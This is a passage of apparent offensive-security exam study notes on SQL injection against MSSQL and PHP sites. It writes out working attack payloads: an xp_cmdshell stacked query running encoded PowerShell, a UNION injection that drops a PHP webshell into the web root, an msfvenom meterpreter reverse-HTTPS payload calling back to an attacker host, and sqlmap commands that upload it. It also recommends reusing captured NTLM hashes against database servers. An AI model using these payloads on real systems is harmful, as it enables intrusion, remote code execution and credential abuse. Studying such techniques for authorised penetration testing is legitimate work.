## SQLi

Example stacked query that worked against a machine:
```sql
'; EXECUTE xp_cmdshell 'powershell -enc JABjAGwAaQBl...AKAApAA==';--
```

For examples of the above and more check out PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

### SQLMap

In OSEP SQLMap is fair game. The methods above still work and may still be handy for probing to acquire the appropriate parameters for SQLMap, but in the end SQLMap is the tool we want:

```bash
sqlmap -u "http://192.168.x.y/loginform.asp" -p uname,psw
```

### Uploading webshells

Basic PHP UNION webshell, first enumerate no. of columns in the table:
```sql
' ORDER BY <Column no. to test>-- //
```
Inject webshell into PHP site via `UNION`:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Of course this is manual and hacky and mostly here so we appreciate the theory. The appropriate approach is ofc with SQLMap:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.y LPORT=443 -f aspx -o /home/kali/met.aspx
```
```bash
sqlmap -u "http://192.168.x.y/loginform.asp?uname=asdf&pws=qwer" -p uname,psw --file-write /home/kali/met.aspx --file-dest C:\\inetpub\\wwwroot\\met.aspx
```

Speaking of which...

### SQLMap

SQLMap is powerful, versatile, and mostly self-documenting. No one size fits all command for its use. Requires a little manual messing around sometimes to find injectable pages and params, consider using in conjunction with `gobuster`. Optional params of note not to forget about here being `--sql-shell` and `--os-shell`.

### mssqlclient

If we manage to lay hands on NTLM hashes/creds don't forget to try and use them against an MSSQL server using `impacket-mssqlclient`. Absolute goldmine. Also mostly self-documenting, don't forget to thoroughly enumerate tables, links and logged in users.
